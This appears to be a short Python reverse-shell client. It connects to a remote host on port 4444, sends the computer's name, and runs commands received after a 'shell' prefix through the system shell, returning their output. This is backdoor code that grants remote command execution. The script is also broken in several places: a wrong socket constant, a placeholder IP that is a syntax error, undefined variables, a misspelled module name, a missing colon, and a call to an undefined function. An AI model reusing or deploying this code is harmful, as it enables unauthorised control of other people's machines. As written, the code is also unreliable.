import socket, os, subprocess

def connect():
    os.system("cls")
    global h
    global p
    global s

    s = socket.socket(socket.IF_NET, socket.SOCK_STREAM)
    p = 4444
    h = #local IP

    try:
        print("[!!!] Connecting to %s:%s"&(host,port))
        s.connect((h,p))
        print("[***] Connected")
        s.send(os.environ["COMPUTERNAME"])
    except:
        print("Could not connect")
def r():
    receive = s.recv(1024)
    if receive == "exit":
        s.close()
    elif receive[0:5] == "shell"
        proc2 = subprocess.Popen(receive[6:],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=suprocess.PIPE)
        stdout_val = proc2.stdout.read() + proc2.stderr.read()
        args = stdout_val
    else:
        args = "not a valid input"
    send(args)
def send(args):
    send = s.send(args)
    receive()
connect()
r()
s.close()
